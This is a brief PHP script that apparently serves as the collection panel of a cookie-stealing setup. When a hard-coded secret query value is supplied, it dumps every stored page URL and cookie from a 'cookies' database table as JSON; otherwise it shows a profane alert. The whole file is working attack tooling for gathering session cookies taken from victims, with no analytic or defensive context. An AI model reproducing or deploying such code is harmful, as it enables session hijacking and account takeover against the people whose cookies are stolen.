<?php


    if ($_GET['x']=='fucku') {
        $conn = mysql_connect(SAE_MYSQL_HOST_M.':'.SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
        if (!$conn){
            die('Could not connect: ' . mysql_error());
        }
        mysql_select_db(SAE_MYSQL_DB, $conn);

        $result = mysql_query("SELECT location as url,cookie FROM cookies");
        $arr = array();

        while ($row = mysql_fetch_assoc($result)) {
            $arr[] = $row;
        }

        echo json_encode($arr);
    }
    else {
        echo "<script>alert('fuck u!')</script>";
    }
   

?>